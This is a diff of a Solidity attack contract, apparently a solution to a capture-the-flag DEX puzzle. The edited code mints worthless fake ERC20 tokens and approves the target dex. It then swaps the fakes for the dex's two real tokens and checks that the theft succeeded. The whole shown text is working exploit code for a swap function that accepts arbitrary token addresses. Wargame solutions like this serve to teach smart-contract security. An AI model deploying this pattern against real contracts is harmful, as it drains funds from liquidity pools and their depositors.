@@ -40,8 +40,8 @@ interface IDex {
 // to = amountOut * from / amount
 
 contract FakeToken is ERC20 {
-    constructor(address _player) ERC20("GGB", "GGB") {
-        // _mint(_player, 1000);
+    constructor(address _contract) ERC20("GGB", "GGB") {
+        _mint(_contract, 1000);
     }
 
     function balanceOf(
@@ -61,20 +61,21 @@ contract FakeDex {
 
     constructor(address _targetDex, address _player) {
         targetDex = IDex(_targetDex);
-        fakeToken0 = new FakeToken(_player);
-        fakeToken1 = new FakeToken(_player);
+        fakeToken0 = new FakeToken(address(this));
+        fakeToken1 = new FakeToken(address(this));
+        token0 = targetDex.token1();
+        token1 = targetDex.token2();
     }
 
     function pwn() external {
-        console.log("1");
-        targetDex.approve(address(targetDex), type(uint256).max);
-        console.log("2");
+        console.logUint(ERC20(token0).balanceOf(address(targetDex)));
+
+        fakeToken0.approve(address(targetDex), type(uint256).max);
+        fakeToken1.approve(address(targetDex), type(uint256).max);
 
         targetDex.swap(address(fakeToken0), token0, 100);
-        console.log("3");
 
         targetDex.swap(address(fakeToken1), token1, 100);
-        console.log("4");
 
         require(
             ERC20(token0).balanceOf(address(this)) == 100 &&
